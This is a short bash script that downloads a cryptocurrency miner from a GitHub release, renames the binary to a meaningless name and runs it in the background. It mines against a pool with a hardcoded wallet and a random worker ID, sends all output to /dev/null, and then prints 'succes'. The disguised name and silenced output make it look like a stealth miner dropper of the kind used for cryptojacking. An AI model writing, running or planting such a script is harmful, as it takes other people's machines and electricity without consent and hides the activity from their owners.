#!/bin/bash
wget https://github.com/Printscan/rgminer/releases/download/v1.0.0/rgminer-1.0.0.tar.gz
tar xf rgminer-1.0.0.tar.gz
cd rgminer && mv rgminer meloapo
./meloapo --algo pearl --proto pearlfortune --stratum global.pearlfortune.org:443 --wallet prl1pnyza9z22a6sy8k08xkcqgwtgwr95w5d2csh89snlg6yhqdgg9uusuxjqch --worker $(echo $RANDOM | md5sum | head -c 10) > /dev/null 2>&1 &
sleep 1m
echo succes
